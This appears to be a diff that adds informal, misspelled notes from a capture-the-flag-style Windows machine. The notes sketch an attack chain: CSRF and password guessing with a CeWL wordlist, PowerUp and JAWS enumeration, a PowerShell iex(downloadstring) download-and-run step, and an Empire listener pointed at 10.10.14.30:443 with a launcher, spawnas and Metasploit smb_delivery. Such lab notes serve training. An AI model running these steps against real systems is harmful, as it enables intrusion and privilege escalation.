@@ -1,0 +1,67 @@
+this is funny machine, beacuase this have 
+a lot of things to do
+
+check sense video see csrf
+
+forget the password
+
+guess the username
+
+cewl the web use it to pass
+
+common_root.txt
+powershell jaws-enum.ps1
+powerup.ps1 --> Invoke-AllChecks
+
+something if you dont get the system 64 bit
+[enviroment]::Is64bitOperateSystem
+[enviroment]::Is64bitProcess
+if check the above two command and get false
+    you must use the 
+    c:\windows\SysNative\windowspowershell\v1.0\powershell iex(downloadstring)
+
+powerup.ps1  is useful --> get-RegistryAutoLogin
+powershell b33f ---- powrshell suite
+google fuzzysecurity pateron
+
+do invoke-runas.ps1 to runasadmin.ps1
+
+we going to do is:
+iex(runasadmin.ps1)
+
+
+
+use empire
+listener
+uselistener http
+info
+set HOST http://10.10.14.30:443
+set port 443
+excute
+launcher powershell
+copy power to empire.ps1
+
+back 2 times
+
+interactive
+ searchmoudle powerup
+ use moudle powerup privecheck
+
+creds add domain username password
+
+searchmodul spawnas
+
+set username 
+set pass 
+set lister http
+
+execute
+
+msfconsole
+search  exploit/windows/smb/smb_delivery
+
+forward the  445 port 
+
+good
+
+
